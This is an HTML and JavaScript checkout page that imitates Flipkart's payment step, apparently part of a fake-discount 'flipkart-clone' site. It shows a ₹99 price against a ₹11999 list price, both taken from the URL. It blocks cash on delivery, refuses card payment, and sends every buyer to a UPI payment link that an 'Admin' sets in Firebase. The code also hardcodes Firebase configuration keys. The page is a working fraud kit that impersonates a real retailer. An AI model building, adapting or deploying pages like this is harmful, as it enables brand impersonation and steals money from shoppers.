<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payments</title>
    <style>
        body { font-family: -apple-system, sans-serif; margin: 0; background: #f1f3f6; color: #212121; padding-bottom: 80px; }
        
        /* Header */
        .header { display: flex; align-items: center; padding: 12px; background: white; border-bottom: 1px solid #e0e0e0; position: sticky; top: 0; z-index: 10; }
        .back-btn { font-size: 24px; margin-right: 15px; cursor: pointer; color: #212121; text-decoration: none; }
        .header-title { font-size: 16px; font-weight: 500; }

        /* Step Indicator */
        .steps-bar { display: flex; justify-content: space-around; padding: 15px 10px; background: white; margin-bottom: 8px; position: relative; }
        .step { text-align: center; flex: 1; z-index: 2; position: relative; }
        .step-circle { width: 22px; height: 22px; border-radius: 50%; border: 1px solid #e0e0e0; display: flex; align-items: center; justify-content: center; margin: 0 auto 5px; background: white; color: #878787; font-size: 12px; }
        .step.done .step-circle { border-color: #2874f0; color: #2874f0; background: #f1f6ff; }
        .step.active .step-circle { background: #2874f0; color: white; border-color: #2874f0; }
        .step-label { font-size: 11px; color: #878787; font-weight: 500; }
        .steps-bar::after { content: ''; position: absolute; top: 26px; left: 15%; right: 15%; height: 2px; background: #2874f0; z-index: 1; }

        /* Payment Options */
        .section-title { padding: 15px; font-size: 14px; color: #878787; font-weight: 500; text-transform: uppercase; }
        .option-card { background: white; display: flex; align-items: center; padding: 15px; border-bottom: 1px solid #f0f0f0; gap: 15px; cursor: pointer; }
        .option-card input[type="radio"] { width: 20px; height: 20px; accent-color: #2874f0; }
        .option-info { flex: 1; }
        .option-name { font-size: 15px; font-weight: 500; }
        .option-sub { font-size: 12px; color: #388e3c; margin-top: 2px; }
        
        /* COD Disabled Style */
        .disabled-opt { opacity: 0.6; cursor: not-allowed; background: #fafafa; }
        .disabled-msg { color: #d32f2f; font-size: 11px; font-weight: bold; margin-top: 4px; }

        /* Price Brief */
        .price-brief { background: white; padding: 15px; margin-top: 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e0e0e0; }

        /* Bottom Bar */
        .bottom-bar { position: fixed; bottom: 0; width: 100%; height: 65px; background: white; display: flex; align-items: center; padding: 0 15px; box-sizing: border-box; border-top: 1px solid #e0e0e0; justify-content: space-between; }
        .price-box { display: flex; flex-direction: column; }
        .pay-btn { background: #fb641b; color: white; border: none; padding: 12px 35px; font-weight: bold; font-size: 15px; border-radius: 2px; cursor: pointer; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="header">
        <span class="back-btn" onclick="history.back()">&larr;</span>
        <span class="header-title">Payments</span>
    </div>

    <div class="steps-bar">
        <div class="step done"><div class="step-circle">✓</div><div class="step-label">Address</div></div>
        <div class="step done"><div class="step-circle">✓</div><div class="step-label">Order Summary</div></div>
        <div class="step active"><div class="step-circle">3</div><div class="step-label">Payment</div></div>
    </div>

    <div class="section-title">Payment Options</div>

    <div class="option-card" onclick="document.getElementById('upi').checked=true">
        <input type="radio" name="pay" id="upi" checked>
        <div class="option-info">
            <div class="option-name">UPI</div>
            <div class="option-sub">Google Pay, PhonePe, BHIM UPI</div>
        </div>
        <img src="https://img1a.flixcart.com/www/linchpin/fk-cp-zion/img/payment-method-upi_60a63c.png" width="30">
    </div>

    <div class="option-card" onclick="document.getElementById('card').checked=true">
        <input type="radio" name="pay" id="card">
        <div class="option-info">
            <div class="option-name">Credit / Debit / ATM Card</div>
            <div class="option-sub">Visa, Mastercard, RuPay & more</div>
        </div>
    </div>

    <div class="option-card disabled-opt">
        <input type="radio" name="pay" id="cod" disabled>
        <div class="option-info">
            <div class="option-name">Cash on Delivery</div>
            <div class="disabled-msg">✕ Not available for this order</div>
        </div>
    </div>

    <div class="price-brief">
        <span style="font-weight: 500; font-size: 14px;">Amount Payable</span>
        <span id="finalAmt" style="font-weight: bold; font-size: 18px;">₹99</span>
    </div>

    <div class="bottom-bar">
        <div class="price-box">
            <span id="strikeAmt" style="text-decoration: line-through; color: #878787; font-size: 12px;">₹11999</span>
            <span id="bottomAmt" style="font-weight: bold; font-size: 18px;">₹99</span>
        </div>
        <button class="pay-btn" onclick="processPayment()">Continue</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBfA-mFODccLz13nLpFQFI5Q2qBNIS2_KI",
            authDomain: "flipkart-clone-ab903.firebaseapp.com",
            databaseURL: "https://flipkart-clone-ab903-default-rtdb.firebaseio.com",
            projectId: "flipkart-clone-ab903",
            storageBucket: "flipkart-clone-ab903.firebasestorage.app",
            messagingSenderId: "733319152647",
            appId: "1:733319152647:web:cb5943fc21d8676bad16a2"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        let upiLinkFromAdmin = "";

        // Fetch UPI Link from Firebase
        onValue(ref(db, 'paymentSettings/upiLink'), (snapshot) => {
            upiLinkFromAdmin = snapshot.val();
        });

        // Price from URL
        const p = new URLSearchParams(window.location.search);
        const price = p.get('price') || "99";
        const mrp = p.get('mrp') || "11999";

        document.getElementById('finalAmt').innerText = "₹" + price;
        document.getElementById('bottomAmt').innerText = "₹" + price;
        document.getElementById('strikeAmt').innerText = "₹" + mrp;

        window.processPayment = function() {
            const isUpi = document.getElementById('upi').checked;
            
            if(isUpi) {
                if(upiLinkFromAdmin) {
                    const btn = document.querySelector('.pay-btn');
                    btn.innerText = "Redirecting...";
                    btn.disabled = true;
                    
                    // Direct to Admin's Payment Link
                    setTimeout(() => {
                        window.location.href = upiLinkFromAdmin;
                    }, 800);
                } else {
                    alert("Technical Error: Payment link not configured by Admin.");
                }
            } else {
                alert("Please select UPI as the payment method.");
            }
        }
    </script>
</body>
</html>
